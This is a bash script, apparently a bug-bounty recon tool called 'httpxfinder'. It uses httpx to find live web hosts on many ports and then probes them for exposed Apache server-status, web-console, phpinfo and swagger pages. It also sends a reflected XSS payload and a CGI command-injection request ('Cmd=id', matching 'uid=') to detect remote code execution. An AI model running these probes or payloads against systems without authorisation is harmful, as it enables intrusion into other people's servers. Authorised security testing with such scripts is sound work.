#!/bin/bash

GREEN='\033[0;32m'
ENDCOLOR='\033[0m'

banner="
  888    888 888    888                       .d888 d8b               888
  888    888 888    888                      d88P'  Y8P               888
  888    888 888    888                      888                      888
  8888888888 888888 888888 88888b.  888  888 888888 888 88888b.   .d88888  .d88b.  888d888
  888    888 888    888    888  88b  Y8bd8P  888    888 888  88b d88  888 d8P  Y8b 888P
  888    888 888    888    888  888   X88K   888    888 888  888 888  888 88888888 888
  888    888 Y88b.  Y88b.  888 d88P .d8  8b. 888    888 888  888 Y88b 888 Y8b.     888
  888    888 Y888   Y888 88888      888  888 888    888 888  888   Y88888   Y8888  888
                           888
                           888
                           888
"

echo -e "${GREEN}$banner${ENDCOLOR}"

url=$1

mkdir httpxfinder

httpx -l $url -silent ports 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,49003,5,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,28081,28091,28091,7 >> httpxfinder/lives.txt
httpx -l $url --status-code --content-length -title -silent ports 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,49003,5,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,28081,28091,28091,7  >> httpxfinder/vivos.txt
httpx -l httpxfinder/lives.txt -path /server-status?full=true -status-code -content-length -mc 200,302  >> httpxfinder/apache-server.txt
httpx -l httpxfinder/lives.txt -t 50 -ports 80,443,8080,8443,8081,8180,8090,8009 -path /web-console -status-code -content-length -mc 200,302 >> httpxfinder/web-console.txt
httpx -l httpxfinder/lives.txt -t 50 -ports 80,443,8080,8443 -path "/?xss=\"</script><script>alert(\"XSS\")</script>" -mr "<script>alert(\"XSS\")</script>" >> httpxfinder/xss.txt
httpx -l httpxfinder/lives.txt -t 50 -path /phpinfo.php --status-code --content-length -title -mc 200,302  >> httpxfinder/phpinfo.txt
httpx -l httpxfinder/lives.txt -t 50 -path /swagger-api --status-code --content-length -mc 200,302 >> httpxfinder/swagger.txt
httpx -l httpxfinder/lives.txt -t 50 -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent >> httpxfinder/rce.txt
